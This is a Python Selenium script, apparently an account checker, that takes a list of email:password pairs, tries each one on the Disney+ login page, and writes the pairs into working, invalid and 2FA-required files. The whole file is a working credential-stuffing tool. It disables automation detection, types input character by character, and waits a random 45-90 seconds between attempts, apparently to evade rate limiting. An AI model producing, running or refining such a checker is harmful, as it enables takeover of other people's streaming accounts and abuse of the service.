"""
DISNEY+ LOGIN TESTER - PROPER WAITING
Waits up to 30 seconds for cookie popup to appear
"""

import time
import random
import os
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options

class DisneyTester:
    def __init__(self):
        self.accounts_file = "my_disney_accounts.txt"
        self.working_file = "WORKING_ACCOUNTS.txt"
        self.invalid_file = "INVALID_ACCOUNTS.txt"
        self.twofa_file = "TWOFA_ACCOUNTS.txt"
        self.accounts = []
        self.working = []
        self.invalid = []
        self.twofa_accounts = []
        
    def load_accounts(self):
        """Load accounts from file"""
        if not os.path.exists(self.accounts_file):
            print(f"❌ {self.accounts_file} not found!")
            return False
        
        with open(self.accounts_file, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#') and ':' in line:
                    email, password = line.split(':', 1)
                    self.accounts.append({
                        'email': email.strip(),
                        'password': password.strip()
                    })
        
        print(f"✅ Loaded {len(self.accounts)} accounts")
        return True
    
    def create_driver(self):
        """Create Chrome driver"""
        options = Options()
        
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
        options.add_argument("--start-maximized")
        
        driver = webdriver.Chrome(options=options)
        driver.set_page_load_timeout(60)
        return driver
    
    def close_cookie_popup_with_wait(self, driver):
        """Wait up to 30 seconds for cookie popup, then close it"""
        print(f"   🍪 Waiting for cookie popup (max 30 seconds)...")
        
        # Wait for cookie popup to appear (up to 30 seconds)
        cookie_found = False
        for i in range(30):
            try:
                # Check if cookie banner exists
                cookie_banner = driver.find_element(By.ID, "onetrust-banner-sdk")
                if cookie_banner.is_displayed():
                    cookie_found = True
                    print(f"   🍪 Cookie popup detected after {i+1} seconds!")
                    break
            except:
                pass
            
            # Also check for any accept button
            try:
                accept_btn = driver.find_element(By.ID, "onetrust-accept-btn-handler")
                if accept_btn.is_displayed():
                    cookie_found = True
                    print(f"   🍪 Cookie popup detected after {i+1} seconds!")
                    break
            except:
                pass
            
            time.sleep(1)
            if i % 5 == 0:
                print(f"   ⏳ Waiting for cookie popup... ({i+1}/30 seconds)")
        
        if not cookie_found:
            print(f"   ✅ No cookie popup appeared after 30 seconds, continuing...")
            return True
        
        # Now try to close the cookie popup
        print(f"   🔧 Attempting to close cookie popup...")
        
        for attempt in range(5):
            try:
                # Try Accept All button
                accept_btn = driver.find_element(By.ID, "onetrust-accept-btn-handler")
                if accept_btn.is_displayed():
                    driver.execute_script("arguments[0].click();", accept_btn)
                    print(f"   ✅ Clicked 'Accept All' button")
                    time.sleep(2)
                    return True
            except:
                pass
            
            try:
                # Try any button with Accept text
                buttons = driver.find_elements(By.TAG_NAME, "button")
                for btn in buttons:
                    text = btn.text.lower()
                    if 'accept' in text or 'agree' in text:
                        driver.execute_script("arguments[0].click();", btn)
                        print(f"   ✅ Clicked '{btn.text}' button")
                        time.sleep(2)
                        return True
            except:
                pass
            
            # Last resort: Remove with JavaScript
            try:
                driver.execute_script("""
                    var banner = document.getElementById('onetrust-banner-sdk');
                    if(banner) banner.remove();
                    var overlay = document.querySelector('[class*="cookie"]');
                    if(overlay) overlay.remove();
                """)
                print(f"   ✅ Removed cookie banner with JavaScript")
                time.sleep(1)
                return True
            except:
                pass
            
            print(f"   ⚠️ Attempt {attempt+1} failed, retrying...")
            time.sleep(2)
        
        print(f"   ⚠️ Could not close cookie popup, continuing anyway...")
        return True
    
    def test_login(self, account):
        """Test login with proper waiting"""
        email = account['email']
        password = account['password']
        
        print(f"\n🔍 Testing: {email[:30]}...")
        
        driver = None
        try:
            driver = self.create_driver()
            
            # Go to Disney+ login
            print(f"   📄 Loading page...")
            driver.get("https://www.disneyplus.com/identity/login/enter-email")
            
            # Wait for page to fully load (up to 15 seconds)
            print(f"   ⏳ Waiting for page to load...")
            for i in range(15):
                if "login" in driver.current_url.lower():
                    print(f"   ✅ Page loaded after {i+1} seconds")
                    break
                time.sleep(1)
            
            time.sleep(3)  # Extra buffer
            
            # Handle cookie popup with proper waiting
            self.close_cookie_popup_with_wait(driver)
            time.sleep(2)
            
            # Wait for email field with longer timeout
            print(f"   📧 Looking for email field...")
            email_input = None
            for attempt in range(15):
                try:
                    email_input = driver.find_element(By.CSS_SELECTOR, "input[type='email']")
                    if email_input.is_displayed():
                        print(f"   ✅ Email field found after {attempt+1} seconds")
                        break
                except:
                    pass
                time.sleep(1)
            
            if not email_input:
                print(f"   ❌ Email field not found after 15 seconds")
                return False
            
            # Click and clear email field
            driver.execute_script("arguments[0].click();", email_input)
            time.sleep(0.5)
            email_input.clear()
            
            # Type email
            for char in email:
                email_input.send_keys(char)
                time.sleep(0.02)
            print(f"   📧 Email entered")
            time.sleep(1)
            
            # Click continue button
            print(f"   📤 Looking for continue button...")
            continue_btn = None
            for attempt in range(10):
                try:
                    continue_btn = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
                    if continue_btn.is_displayed():
                        print(f"   ✅ Continue button found after {attempt+1} seconds")
                        break
                except:
                    pass
                time.sleep(1)
            
            if not continue_btn:
                print(f"   ❌ Continue button not found")
                return False
            
            driver.execute_script("arguments[0].click();", continue_btn)
            print(f"   📤 Continue clicked")
            
            # Wait for password page to load
            print(f"   ⏳ Waiting for password page...")
            time.sleep(5)
            
            # Check for 2FA
            page_text = driver.page_source.lower()
            if 'verification' in page_text or 'code' in page_text:
                if 'enter' in page_text:
                    print(f"   🔐 2FA REQUIRED - Skipping account")
                    self.twofa_accounts.append({'email': email, 'password': password})
                    self.save_2fa()
                    return None
            
            # Wait for password field
            print(f"   🔑 Looking for password field...")
            password_input = None
            for attempt in range(20):
                try:
                    password_input = driver.find_element(By.CSS_SELECTOR, "input[type='password']")
                    if password_input.is_displayed():
                        print(f"   ✅ Password field found after {attempt+1} seconds")
                        break
                except:
                    pass
                time.sleep(1)
            
            if not password_input:
                print(f"   ❌ Password field not found after 20 seconds")
                # Check again for 2FA
                if 'verification' in driver.page_source.lower():
                    print(f"   🔐 2FA REQUIRED - Skipping account")
                    self.twofa_accounts.append({'email': email, 'password': password})
                    self.save_2fa()
                    return None
                return False
            
            driver.execute_script("arguments[0].click();", password_input)
            time.sleep(0.5)
            password_input.clear()
            
            # Type password
            for char in password:
                password_input.send_keys(char)
                time.sleep(0.02)
            print(f"   🔑 Password entered")
            time.sleep(1)
            
            # Click login button
            login_btn = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
            driver.execute_script("arguments[0].click();", login_btn)
            print(f"   📤 Login clicked")
            
            # Wait for result
            print(f"   ⏳ Waiting for login result...")
            time.sleep(10)
            
            # Check result
            current_url = driver.current_url.lower()
            
            if 'home' in current_url or 'browse' in current_url or 'subscription' in current_url:
                print(f"   ✅✅✅ WORKING! ✅✅✅")
                self.working.append({'email': email, 'password': password})
                self.save_results()
                return True
            elif 'login' in current_url:
                print(f"   ❌ INVALID - Wrong password")
                self.invalid.append({'email': email, 'password': password})
                self.save_results()
                return False
            else:
                print(f"   ❌ INVALID - Login failed")
                self.invalid.append({'email': email, 'password': password})
                self.save_results()
                return False
                    
        except Exception as e:
            print(f"   ❌ Error: {str(e)[:80]}")
            self.invalid.append({'email': email, 'password': password})
            self.save_results()
            return False
            
        finally:
            if driver:
                driver.quit()
                delay = random.uniform(45, 90)
                print(f"   ⏰ Waiting {delay:.0f} seconds before next account...")
                time.sleep(delay)
    
    def save_results(self):
        """Save working and invalid accounts"""
        if self.working:
            with open(self.working_file, 'w') as f:
                f.write("="*50 + "\n")
                f.write("✅ WORKING DISNEY+ ACCOUNTS ✅\n")
                f.write("="*50 + "\n\n")
                for acc in self.working:
                    f.write(f"{acc['email']}:{acc['password']}\n")
            print(f"\n💾 Saved {len(self.working)} working accounts")
        
        if self.invalid:
            with open(self.invalid_file, 'w') as f:
                f.write("="*50 + "\n")
                f.write("❌ INVALID DISNEY+ ACCOUNTS ❌\n")
                f.write("="*50 + "\n\n")
                for acc in self.invalid:
                    f.write(f"{acc['email']}:{acc['password']}\n")
            print(f"💾 Saved {len(self.invalid)} invalid accounts")
    
    def save_2fa(self):
        """Save 2FA accounts"""
        if self.twofa_accounts:
            with open(self.twofa_file, 'w') as f:
                f.write("="*50 + "\n")
                f.write("🔐 2FA REQUIRED ACCOUNTS 🔐\n")
                f.write("="*50 + "\n\n")
                for acc in self.twofa_accounts:
                    f.write(f"{acc['email']}:{acc['password']}\n")
            print(f"💾 Saved {len(self.twofa_accounts)} 2FA accounts")
    
    def check_all(self):
        """Check all accounts"""
        for i, account in enumerate(self.accounts, 1):
            print(f"\n{'='*50}")
            print(f"[{i}/{len(self.accounts)}]")
            print(f"{'='*50}")
            self.test_login(account)

def main():
    tester = DisneyTester()
    
    print("="*50)
    print("🎬 DISNEY+ LOGIN TESTER")
    print("="*50)
    
    if not tester.load_accounts():
        print("\n📝 Create my_disney_accounts.txt with:")
        print("   email:password")
        return
    
    print(f"\n📊 {len(tester.accounts)} accounts to test")
    print(f"⏱️ Estimated time: ~{len(tester.accounts)} minutes")
    print("\n⚠️ Each account takes 45-90 seconds (including delays)")
    print("⚠️ Cookie popup: Script waits up to 30 seconds for it")
    
    confirm = input("\n▶️ Start testing? (yes/no): ")
    
    if confirm.lower() == 'yes':
        start_time = time.time()
        tester.check_all()
        end_time = time.time()
        
        print(f"\n{'='*50}")
        print("✅ TESTING COMPLETE!")
        print(f"{'='*50}")
        print(f"⏱️ Total time: {(end_time - start_time) / 60:.1f} minutes")
        print(f"✅ Working: {len(tester.working)}")
        print(f"❌ Invalid: {len(tester.invalid)}")
        print(f"🔐 2FA Required: {len(tester.twofa_accounts)}")
        print(f"\n📁 Files created:")
        print(f"   - WORKING_ACCOUNTS.txt")
        print(f"   - INVALID_ACCOUNTS.txt")
        print(f"   - TWOFA_ACCOUNTS.txt")

if __name__ == "__main__":
    main()
